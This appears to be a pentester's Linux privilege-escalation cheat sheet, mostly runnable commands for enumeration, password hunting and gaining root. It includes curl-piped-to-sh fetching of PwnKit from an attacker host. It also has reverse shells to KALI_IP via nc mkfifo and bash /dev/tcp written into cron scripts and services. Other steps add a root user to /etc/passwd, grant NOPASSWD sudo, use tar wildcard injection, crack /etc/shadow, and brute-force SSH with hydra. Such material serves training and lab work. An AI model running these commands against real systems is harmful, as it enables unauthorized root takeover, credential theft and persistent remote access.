# ***LHF***
## sudo -l
```shell
sudo -l
# then GTFObins
```
## setuid / capabilites
```shell
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
# then GTFObins
```
## pkexec (pwnkit/polkit)
```shell
sh -c "$(curl http://KALI_IP/linux/PwnKit.sh)"
```
## Kernel Vulns

```shell
# os version
cat /etc/issue
cat /etc/*-release

# kernel version and arch
uname -a
arch

#
# SEARCHSPLOIT using above output
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

# ALSO CHECK SETUID BINS
```
# ***Manual***
## Quick Enum
```shell
# User #
whoami ; id
uname -a
sudo -l
cat ~/.bash_history
cat .bashrc
env

# OS #
# version
cat /etc/issue
cat /etc/*-release
# kernel 
uname -a
cat /proc/version
arch
# modules
lsmod
/usr/bin/modinfo module


# Network #
ip a
routel #routes
ss -anp #sockets
netsta -ano
cat /etc/iptables/rules.v4 #firewall



# processes #
ps aux | grep
ps aux | grep $(whoami) #user procs
ps aux | grep -E "/home|/tmp|/var/tmp" #non-standard dir
#
# packages and version
dpkg -l
dpkg -l | grep -w 'ii sudo'
dpkg -l | grep -w 'ii mysql'
sudo --version
mysql --version



# drives #
cat /etc/fstab
mount #drives not found in /etc/fstab
lsblk #available disks
```
## File search
```shell
# Owned by current user / group
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null

find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null

# Owned by Root but atLeast Writeable by others
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /boot -o -path /lost+found -o -path /lib -o -path /lib64 -o -path /usr \) -prune -o -user root -type f -perm /022 -exec ls -la {} \; 2>/dev/null

# World Writable by Groups/Others (ignore User)
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /boot -o -path /lost+found -o -path /lib -o -path /lib64 -o -path /usr \) -prune -o -type f -perm /022 -exec ls -l {} \; 2>/dev/null
# /home /tmp /var/tmp

# Owner ONLY RW
find /home /var /opt /tmp \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /boot -o -path /lost+found -o -path /lib -o -path /lib64 -o -path /usr \) -prune -o -type f -perm 0600 -exec ls -l {} \; 2>/dev/null

# Interesting / Hidden files
find /home /var /opt -type f \( -name ".*" -o -name "*.bak" -o -name "*backup*" -o -name "*conf*" -o -name "*old*" -o -name "*.script" -o -name "*.log" -o -name "*.txt" -o -name "*passw*" -o -name "*pwd*" -o -name "*cred*" \) -exec ls -l {} \; 2>/dev/null
# may be start from /



# /etc/passwd and shadow files perms #
ls -l /etc/passwd
ls -l /etc/shadow
cat /etc/passwd
cat /etc/shadow

# Others
ls -la /
ls -la /opt
ls -la /tmp
ls -la /var
ls -la /var/tmp
ls -la /var/spool/cron
```

```shell
# Web folders
ls -la /var/www
ls -la /var/www/html
ls -la /srv/html

# Recrusive by owner, size and extension
# find / -user user -size 1M -type f -name ".txt"
```
## Passwords search
```shell
# Search for Passwords
# /var/www/html
# .ssh folder
# /home/user/interesting/folders
# /var/
# interesting/hidden folder in /

# A In Path
grep --color=auto -rnw '/' -iIE "passw|passwd|password|pwd|secret|key" --color=always 2>/dev/null


# B From a path
cd to/path
grep --color=auto -rnw -iIE "passw|passwd|password|pwd|secret|key" --color=always 2>/dev/null


# C In User files
cat ~/.bash_history
cat ~/.bashrc
strings file_name | grep -iE "password|pass|pwd|secret|key"


# D In Service Logs
journalctl -u <service_name> | grep -E "password"

# Check below for manual tips
# https://juggernaut-sec.com/password-hunting-lpe/#Password_Hunting_with_Tools_–_LinPEAS
```
## Cron
```shell
# Systemwide cron
cat /etc/crontab
ls -l /etc/cron* # check for non root


# Current user
crontab -l
crontab -e
#/var/spool/cron/* isn't readable


# ROOT cron if you can read it (sudoers allows it)
sudo crontab -l


# Logs
cat /var/log/cron.log
cat /var/log/syslog

# Check linpeas.sh and pspy64
```
## Services
```shell
# A Search for unusual and writeable .service files

# in standard paths ( use / for across system)
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type f -name "*.service" -perm [ -o+w | -ug+w ] 2>/dev/null

# user and non-standard dirs
find /home /tmp /var/tmp ...

# show path
find ... -exec ls -lh {} + 2>/dev/null | grep -E "bin|service"


# B List services using Systemctl

# standard
systemctl list-units --type=service --state=running
systemctl list-unit-files --type=service

# view service
systemctl cat <service_name>

# view perms
ls -l /etc/systemd/system/<service_name>.service

# View service environ
systemctl show <service_name> | grep Environment


# C Search for Logs
# standard
journalctl -u <service_name>
journalctl -u <service_name> | grep -E "error|failed|password|debug"

# in user directory
find /home /tmp /var/tmp -type f -name "*.log" 2>/dev/null
cat /path/to/log | grep -E "password|key|error"
ps aux | grep debug

```
# ***Auto***
## **linpeas.sh / lse.sh**

```shell
# linpeas / lse
wget http://KALI_IP/linuxlinpeash.sh
wget http://KALI_IP/linux/lse.sh
# chmod u+x the scripts and run

# pspy
wget http://KALI_IP/linux/rpspy64.py
./pspy64 -r /bin,/etc,/home,/opt,/var,/usr,/tmp -pf -i 1000
# https://github.com/DominicBreuker/pspy
# https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b 
```
## pspy (hidden crons)
```shell
# 1 check daemon is running (if you cant find any crons in /etc/crontab or /etc/cron*)
ps -efw | grep -i "cron"

# 2 If running, run pspy64
cd /dev/shm
curl http://KALI_IP/linux/pspy64 -o pspy64
chmod +x ./pspy64
./pspy64
```
# ***Attacks***
## su
```
su SOMEUSER
```
## bruteforce user

```shell
# min 6 max 6 length password pattern
crunch 6 6 -t Lab%%% > wordlist
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```
## writeble /etc/passwd
***If you can write to /etc/passwd, you can add an arbitrary privileged user***
```shell
openssl passwd password
echo "root2:COPY_FROM_ABOVE:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
id
```
## writeable /etc/shadow
```shell
# 1 Make the password
mkpasswd -m sha-512 password

# 2 Backup the /etc/shadow
cp /etc/shadow /home/user/shadow.bak

# 3 Change the appropriate line

# 4 Login
su root
```
## writeable sudoers
```shell
echo "`whoami` ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```
## readable /etc/shadow
```shell
# 1 Copy /etc/passwd and /etc/shadow to files "passwd.john" and "shadow.john"

# 2 Unshadow
unshadow ./passwd.john ./shadow.john > unshadowed.john

# 3 Crack
john ./unshadowed.john --wordlist=/usr/share/wordlists/rockyou.txt
```
## readable /root ssh keys
```shell
ssh -i root_id_rsa root@`tip`
```
## writable cron script

```shell
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc KALI_IP 443 >/tmp/f" >> user_backups.sh
cat user_backups.sh
```
## writable /etc/crontab
### A Replace script
```shell
* * * * * root /tmp/malicious_script.sh
```
### B Writeable Path is in PATH
***For example, if backup.sh uses "tar", we can modify the PATH to have our "tar" run***
```shell
# 1 Create our "tar" in the writeable path Here, we can write in /dev/shm
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar

# 2 modify PATH
export PATH=/tmp:$PATH
* * * * * root backup.sh # (backup.sh uses tar command inside it for example)

# Can replace with any payload i.e reverse shell, add root user, copy of bash etc
```
### C Wildcards used
***If the cron job executes a command with wildcards (e.g., `tar -cvf /tmp/backup.tar *`), you can exploit this by creating malicious files.***
```shell
# 1 After cding into the writeable directory 


# 2 Create the payload
echo '#!/bin/bash' > /tmp/malicious.sh
echo "" >> /tmp/malicious.sh


# A add root user
echo 'echo "r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /tmp/malicious.sh

# B root bash
echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' > /tmp/malicious.sh

# 3 Touch the files
touch '/tmp/--checkpoint=1'
touch '/tmp/--checkpoint-action=exec=sh malicious.sh'
```
## writeable service
***If you find writable binaries or scripts, you can write reverse shell***
```shell
echo 'bash -i >& /dev/tcp/KALI_IP/1234 0>&1' > /path/to/service_executable
chmod +x /path/to/service_executable
```

